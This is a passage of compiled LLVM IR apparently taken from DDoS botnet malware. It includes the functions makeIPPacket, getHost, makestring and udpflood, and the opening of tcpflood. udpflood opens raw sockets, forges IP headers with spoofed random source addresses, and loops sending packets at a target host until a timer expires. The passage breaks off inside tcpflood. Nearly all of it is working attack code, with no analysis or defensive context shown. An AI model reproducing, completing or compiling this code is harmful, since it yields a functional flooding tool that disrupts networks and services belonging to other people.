  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias i8* @malloc(i64 noundef %26) #11
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %30, i8* align 8 %31, i64 24, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %34, i8* align 1 %36, i64 20, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* noundef %37, i32 noundef %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* noundef %41) #11
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

; Function Attrs: nounwind
declare void @free(i8* noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* noundef %0, i32 noundef %1, i32 noundef %2, i8 noundef zeroext %3, i32 noundef %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getHost(i8* noundef %0, %struct.in_addr* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* noundef %7) #11
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @filter(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %23, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* noundef %5) #12
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %21, label %12

12:                                               ; preds = %3
  %13 = load i8*, i8** %2, align 8
  %14 = load i8*, i8** %2, align 8
  %15 = call i64 @strlen(i8* noundef %14) #12
  %16 = sub i64 %15, 1
  %17 = getelementptr inbounds i8, i8* %13, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 10
  br label %21

21:                                               ; preds = %12, %3
  %22 = phi i1 [ true, %3 ], [ %20, %12 ]
  br i1 %22, label %23, label %29

23:                                               ; preds = %21
  %24 = load i8*, i8** %2, align 8
  %25 = load i8*, i8** %2, align 8
  %26 = call i64 @strlen(i8* noundef %25) #12
  %27 = sub i64 %26, 1
  %28 = getelementptr inbounds i8, i8* %24, i64 %27
  store i8 0, i8* %28, align 1
  br label %3, !llvm.loop !11

29:                                               ; preds = %21
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #11
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 noundef %13) #11
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %15, i8 0, i64 %18, i1 false)
  %19 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %4, align 8
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %39

21:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  br label %22

22:                                               ; preds = %35, %21
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* %2, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %38

26:                                               ; preds = %22
  %27 = call i32 @rand() #11
  %28 = srem i32 %27, 26
  %29 = add nsw i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %1, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

35:                                               ; preds = %26
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %22, !llvm.loop !12

38:                                               ; preds = %22
  br label %68

39:                                               ; preds = %0
  %40 = call i32 @rand() #11
  %41 = call i32 @rand() #11
  %42 = mul nsw i32 %40, %41
  %43 = srem i32 %42, 45402
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %45

45:                                               ; preds = %53, %39
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %6, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %56

49:                                               ; preds = %45
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %52 = call i8* @fgets(i8* noundef %50, i32 noundef 1024, %struct._IO_FILE* noundef %51)
  br label %53

53:                                               ; preds = %49
  %54 = load i32, i32* %3, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %3, align 4
  br label %45, !llvm.loop !13

56:                                               ; preds = %45
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %57, i8 0, i64 1024, i1 false)
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %59 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %60 = call i8* @fgets(i8* noundef %58, i32 noundef 1024, %struct._IO_FILE* noundef %59)
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  call void @filter(i8* noundef %61)
  %62 = load i8*, i8** %1, align 8
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %64 = load i32, i32* %2, align 4
  %65 = sext i32 %64 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %62, i8* align 16 %63, i64 %65, i1 false)
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* noundef %66)
  br label %68

68:                                               ; preds = %56, %38
  %69 = load i8*, i8** %1, align 8
  ret i8* %69
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #6

declare i8* @fgets(i8* noundef, i32 noundef, %struct._IO_FILE* noundef) #6

declare i32 @fclose(%struct._IO_FILE* noundef) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @udpflood(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i64, align 8
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

30:                                               ; preds = %4
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

34:                                               ; preds = %4
  %35 = load i32, i32* %6, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 noundef zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

39:                                               ; preds = %34, %30
  %40 = load i8*, i8** %5, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %42 = call i32 @getHost(i8* noundef %40, %struct.in_addr* noundef %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  br label %258

45:                                               ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 8, i1 false)
  %48 = load i32, i32* %9, align 4
  store i32 %48, i32* %12, align 4
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %51, label %104

51:                                               ; preds = %45
  %52 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #11
  store i32 %52, i32* %13, align 4
  %53 = load i32, i32* %13, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %56, label %55

55:                                               ; preds = %51
  br label %258

56:                                               ; preds = %51
  %57 = load i32, i32* %8, align 4
  %58 = add nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = call noalias i8* @malloc(i64 noundef %59) #11
  store i8* %60, i8** %14, align 8
  %61 = load i8*, i8** %14, align 8
  %62 = icmp eq i8* %61, null
  br i1 %62, label %63, label %64

63:                                               ; preds = %56
  br label %258

64:                                               ; preds = %56
  %65 = load i8*, i8** %14, align 8
  %66 = load i32, i32* %8, align 4
  %67 = add nsw i32 %66, 1
  %68 = sext i32 %67 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %65, i8 0, i64 %68, i1 false)
  %69 = load i8*, i8** %14, align 8
  %70 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* noundef %69, i32 noundef %70)
  %71 = call i64 @time(i64* noundef null) #11
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %76

76:                                               ; preds = %100, %99, %64
  %77 = load i32, i32* %13, align 4
  %78 = load i8*, i8** %14, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %82 = call i64 @sendto(i32 noundef %77, i8* noundef %78, i64 noundef %80, i32 noundef 0, %struct.sockaddr* noundef %81, i32 noundef 16)
  %83 = load i32, i32* %16, align 4
  %84 = load i32, i32* %12, align 4
  %85 = icmp eq i32 %83, %84
  br i1 %85, label %86, label %100

86:                                               ; preds = %76
  %87 = load i32, i32* %6, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

89:                                               ; preds = %86
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %91, i16* %92, align 2
  br label %93

93:                                               ; preds = %89, %86
  %94 = call i64 @time(i64* noundef null) #11
  %95 = load i32, i32* %15, align 4
  %96 = sext i32 %95 to i64
  %97 = icmp sgt i64 %94, %96
  br i1 %97, label %98, label %99

98:                                               ; preds = %93
  br label %103

99:                                               ; preds = %93
  store i32 0, i32* %16, align 4
  br label %76

100:                                              ; preds = %76
  %101 = load i32, i32* %16, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %16, align 4
  br label %76

103:                                              ; preds = %98
  br label %258

104:                                              ; preds = %45
  %105 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #11
  store i32 %105, i32* %17, align 4
  %106 = load i32, i32* %17, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %109, label %108

108:                                              ; preds = %104
  br label %258

109:                                              ; preds = %104
  store i32 1, i32* %18, align 4
  %110 = load i32, i32* %17, align 4
  %111 = bitcast i32* %18 to i8*
  %112 = call i32 @setsockopt(i32 noundef %110, i32 noundef 0, i32 noundef 3, i8* noundef %111, i32 noundef 4) #11
  %113 = icmp slt i32 %112, 0
  br i1 %113, label %114, label %115

114:                                              ; preds = %109
  br label %258

115:                                              ; preds = %109
  store i32 50, i32* %19, align 4
  br label %116

116:                                              ; preds = %120, %115
  %117 = load i32, i32* %19, align 4
  %118 = add nsw i32 %117, -1
  store i32 %118, i32* %19, align 4
  %119 = icmp ne i32 %117, 0
  br i1 %119, label %120, label %127

120:                                              ; preds = %116
  %121 = call i64 @time(i64* noundef null) #11
  %122 = call i32 @rand_cmwc()
  %123 = zext i32 %122 to i64
  %124 = xor i64 %121, %123
  %125 = trunc i64 %124 to i32
  call void @srand(i32 noundef %125) #11
  %126 = call i32 @rand() #11
  call void @init_rand(i32 noundef %126)
  br label %116, !llvm.loop !14

127:                                              ; preds = %116
  %128 = load i32, i32* %10, align 4
  %129 = icmp eq i32 %128, 0
  br i1 %129, label %130, label %131

130:                                              ; preds = %127
  store i32 0, i32* %20, align 4
  br label %137

131:                                              ; preds = %127
  %132 = load i32, i32* %10, align 4
  %133 = sub nsw i32 32, %132
  %134 = shl i32 1, %133
  %135 = sub nsw i32 %134, 1
  %136 = xor i32 %135, -1
  store i32 %136, i32* %20, align 4
  br label %137

137:                                              ; preds = %131, %130
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 28, %139
  %141 = call i8* @llvm.stacksave()
  store i8* %141, i8** %21, align 8
  %142 = alloca i8, i64 %140, align 16
  store i64 %140, i64* %22, align 8
  %143 = bitcast i8* %142 to %struct.iphdr*
  store %struct.iphdr* %143, %struct.iphdr** %23, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = getelementptr i8, i8* %145, i64 20
  %147 = bitcast i8* %146 to %struct.udphdr*
  store %struct.udphdr* %147, %struct.udphdr** %24, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = load i32, i32* %20, align 4
  %153 = call i32 @getRandomIP(i32 noundef %152)
  %154 = call i32 @htonl(i32 noundef %153) #10
  %155 = load i32, i32* %8, align 4
  %156 = sext i32 %155 to i64
  %157 = add i64 8, %156
  %158 = trunc i64 %157 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %148, i32 noundef %151, i32 noundef %154, i8 noundef zeroext 17, i32 noundef %158)
  %159 = load i32, i32* %8, align 4
  %160 = sext i32 %159 to i64
  %161 = add i64 8, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 noundef zeroext %162) #10
  %164 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  %166 = call i32 @rand_cmwc()
  %167 = trunc i32 %166 to i16
  %168 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %169 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %168, i32 0, i32 0
  store i16 %167, i16* %169, align 2
  %170 = load i32, i32* %6, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %174

172:                                              ; preds = %137
  %173 = call i32 @rand_cmwc()
  br label %179

174:                                              ; preds = %137
  %175 = load i32, i32* %6, align 4
  %176 = trunc i32 %175 to i16
  %177 = call zeroext i16 @htons(i16 noundef zeroext %176) #10
  %178 = zext i16 %177 to i32
  br label %179

179:                                              ; preds = %174, %172
  %180 = phi i32 [ %173, %172 ], [ %178, %174 ]
  %181 = trunc i32 %180 to i16
  %182 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 3
  store i16 0, i16* %185, align 2
  %186 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %187 = bitcast %struct.udphdr* %186 to i8*
  %188 = getelementptr inbounds i8, i8* %187, i64 8
  %189 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* noundef %188, i32 noundef %189)
  %190 = bitcast i8* %142 to i16*
  %191 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  %193 = load i16, i16* %192, align 2
  %194 = zext i16 %193 to i32
  %195 = call zeroext i16 @csum(i16* noundef %190, i32 noundef %194)
  %196 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 7
  store i16 %195, i16* %197, align 2
  %198 = call i64 @time(i64* noundef null) #11
  %199 = load i32, i32* %7, align 4
  %200 = sext i32 %199 to i64
  %201 = add nsw i64 %198, %200
  %202 = trunc i64 %201 to i32
  store i32 %202, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %203

203:                                              ; preds = %253, %252, %179
  br label %204

204:                                              ; preds = %203
  %205 = load i32, i32* %17, align 4
  %206 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %207 = call i64 @sendto(i32 noundef %205, i8* noundef %142, i64 noundef %140, i32 noundef 0, %struct.sockaddr* noundef %206, i32 noundef 16)
  %208 = call i32 @rand_cmwc()
  %209 = trunc i32 %208 to i16
  %210 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  store i16 %209, i16* %211, align 2
  %212 = load i32, i32* %6, align 4
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %214, label %216

214:                                              ; preds = %204
  %215 = call i32 @rand_cmwc()
  br label %221

216:                                              ; preds = %204
  %217 = load i32, i32* %6, align 4
  %218 = trunc i32 %217 to i16
  %219 = call zeroext i16 @htons(i16 noundef zeroext %218) #10
  %220 = zext i16 %219 to i32
  br label %221

221:                                              ; preds = %216, %214
  %222 = phi i32 [ %215, %214 ], [ %220, %216 ]
  %223 = trunc i32 %222 to i16
  %224 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 1
  store i16 %223, i16* %225, align 2
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 3
  store i16 %227, i16* %229, align 4
  %230 = load i32, i32* %20, align 4
  %231 = call i32 @getRandomIP(i32 noundef %230)
  %232 = call i32 @htonl(i32 noundef %231) #10
  %233 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  %235 = bitcast i8* %142 to i16*
  %236 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 2
  %238 = load i16, i16* %237, align 2
  %239 = zext i16 %238 to i32
  %240 = call zeroext i16 @csum(i16* noundef %235, i32 noundef %239)
  %241 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 7
  store i16 %240, i16* %242, align 2
  %243 = load i32, i32* %26, align 4
  %244 = load i32, i32* %12, align 4
  %245 = icmp eq i32 %243, %244
  br i1 %245, label %246, label %253

246:                                              ; preds = %221
  %247 = call i64 @time(i64* noundef null) #11
  %248 = load i32, i32* %25, align 4
  %249 = sext i32 %248 to i64
  %250 = icmp sgt i64 %247, %249
  br i1 %250, label %251, label %252

251:                                              ; preds = %246
  br label %256

252:                                              ; preds = %246
  store i32 0, i32* %26, align 4
  br label %203

253:                                              ; preds = %221
  %254 = load i32, i32* %26, align 4
  %255 = add i32 %254, 1
  store i32 %255, i32* %26, align 4
  br label %203

256:                                              ; preds = %251
  %257 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %257)
  br label %258

258:                                              ; preds = %256, %114, %108, %103, %63, %55, %44
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #2

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #2

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr* noundef, i32 noundef) #6

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #2

; Function Attrs: nounwind
declare void @srand(i32 noundef) #2

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #1

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @tcpflood(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i8* noundef %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i64, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %25 = load i32, i32* %12, align 4
  store i32 %25, i32* %13, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %7, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %33

29:                                               ; preds = %5
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  br label %38

33:                                               ; preds = %5
  %34 = load i32, i32* %7, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 noundef zeroext %35) #10
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  br label %38

38:                                               ; preds = %33, %29
  %39 = load i8*, i8** %6, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %41 = call i32 @getHost(i8* noundef %39, %struct.in_addr* noundef %40)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %44

43:                                               ; preds = %38
  br label %336

44:                                               ; preds = %38
